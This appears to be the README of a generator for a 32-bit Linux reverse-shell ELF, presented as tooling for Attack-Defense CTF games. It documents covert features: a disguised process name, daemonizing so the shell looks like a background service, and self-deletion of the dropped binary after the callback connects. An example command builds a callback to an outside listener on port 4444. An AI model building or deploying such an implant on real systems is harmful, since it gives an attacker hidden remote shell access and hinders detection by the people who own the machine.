# Minimal reverse shell generator
Builds a 32-bit Linux flat ELF callback using the `int 0x80` socketcall ABI,
with features aimed at surviving on an Attack-Defense CTF box once deployed:

- IPv4 TCP reverse callback → `/bin/sh`
- custom `argv[0]` for the process-listing behavior used by the challenge
- daemonize (fork + setsid) so the process reads as a background service
- self-destruct: unlink the dropped binary once the callback is live
- configurable shell executable and any TCP port for custom service setups

## Setup

Run `./dependencies.sh` on Debian or Ubuntu, or install NASM manually. The
generator only needs NASM; `ld` is not required for a flat binary.

## Usage

```sh
python3 generate_elf.py <IP_ADDRESS> <PORT> <CUSTOM_PROCESS_NAME> [options]
```

| option | default | purpose |
| ------ | ------- | ------- |
| `-o PATH` | `vuln` | ELF output path |
| `--asm-output PATH` | `vuln.asm` | generated NASM source |
| `--no-daemonize` | daemonize on | run attached to the caller's session |
| `--drop-path PATH` | off | unlink this file (your own binary) after the callback connects |
| `--shell PATH` | `/bin//sh` | shell executable handed to `execve` |

Example:

```sh
python3 generate_elf.py 192.0.2.10 4444 worker \
    -o ./vuln --asm-output ./vuln.asm \
    --drop-path /tmp/worker
```

The IP and port are plain arguments, so the callback can target a service
running on any port the game uses. Deploy by copying `vuln` to exactly the
`--drop-path` location and executing it; the self-destruct only works if that
path matches the real deployment path. The resulting ELF is 32-bit x86 Linux
and requires a listener on the configured address and port.
